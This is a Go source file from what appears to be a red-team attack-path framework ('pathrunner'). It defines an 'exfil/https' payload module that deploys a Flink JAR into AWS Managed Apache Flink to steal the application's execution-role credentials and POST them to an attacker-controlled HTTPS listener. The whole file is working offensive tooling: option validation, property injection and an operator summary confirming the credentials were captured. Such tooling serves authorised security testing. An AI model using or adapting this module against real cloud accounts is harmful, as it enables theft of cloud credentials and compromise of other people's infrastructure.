// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package kinesisanalytics

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ExfilHTTPSPayload targets a Flink JAR that extracts the application's service
// execution role credentials and POSTs them to an attacker-controlled HTTPS endpoint.
//
// Required JAR: kinesisanalytics/exfil-https/payload.jar in the attacker code bucket,
// or provide CODE_BUCKET/CODE_KEY manually. The JAR reads HTTPS_URL from the Flink
// EnvironmentProperties group "PayloadProperties".
//
// HTTPS_URL is auto-populated from the attacker listener when 'attacker listener start'
// has been run. Credentials arrive at /collect on the listener's HTTPS port.
type ExfilHTTPSPayload struct{}

func init() {
	_ = payloads.Register(&ExfilHTTPSPayload{})
}

func (p *ExfilHTTPSPayload) GetName() string {
	return "exfil/https"
}

func (p *ExfilHTTPSPayload) GetDescription() string {
	return "Exfiltrate execution role credentials to an attacker HTTPS endpoint via a Managed Apache Flink application"
}

func (p *ExfilHTTPSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceKinesisAnalytics,
		payloads.TagLanguageJava,
		payloads.TagTechniqueExfil,
		payloads.TagTransportHTTPS,
	}
}

func (p *ExfilHTTPSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "HTTPS_URL",
			Description: "Attacker-controlled HTTPS endpoint for credential collection (auto-populated by 'attacker listener start')",
			Required:    true,
		},
	}
}

func (p *ExfilHTTPSPayload) Validate(options map[string]string) error {
	httpsURL := options["HTTPS_URL"]
	if httpsURL == "" {
		return fmt.Errorf("HTTPS_URL is required for exfil/https payload")
	}
	if !strings.HasPrefix(httpsURL, "http://") && !strings.HasPrefix(httpsURL, "https://") {
		return fmt.Errorf("HTTPS_URL must start with http:// or https://")
	}
	return nil
}

// GenerateCode is not used for JAR-based payloads — the JAR is pre-compiled.
func (p *ExfilHTTPSPayload) GenerateCode(_ map[string]string) (string, error) {
	return "", nil
}

// ProcessResult formats a summary directing the operator to the listener for captured credentials.
func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
	var r struct {
		App    string `json:"app"`
		Role   string `json:"role"`
		Region string `json:"region"`
	}
	if err := json.Unmarshal([]byte(result), &r); err != nil {
		return result, nil
	}

	var out strings.Builder
	out.WriteString("Credential exfiltration initiated.\n\n")
	fmt.Fprintf(&out, "  App:    %s (%s)\n", r.App, r.Region)
	fmt.Fprintf(&out, "  Via:    Flink execution role %s\n\n", r.Role)
	out.WriteString("Credentials were POSTed to the attacker listener at /collect.\n")
	out.WriteString("Run 'identity list' to see if they were auto-imported, or check 'attacker listener log'.\n")
	return out.String(), nil
}

// GetJARKey returns the S3 key where the universal payload JAR is stored.
func (p *ExfilHTTPSPayload) GetJARKey() string {
	return "kinesisanalytics/pathrunner-payload/payload.jar"
}

// GetEmbeddedJAR returns the pre-compiled Flink payload JAR bytes embedded in the binary.
func (p *ExfilHTTPSPayload) GetEmbeddedJAR() []byte {
	return GetEmbeddedJAR()
}

// GetFlinkProperties returns the EnvironmentProperties the JAR reads at startup.
func (p *ExfilHTTPSPayload) GetFlinkProperties(options map[string]string) map[string]map[string]string {
	return map[string]map[string]string{
		"PayloadProperties": {
			"PAYLOAD_TYPE": "exfil/https",
			"HTTPS_URL":    options["HTTPS_URL"],
		},
	}
}
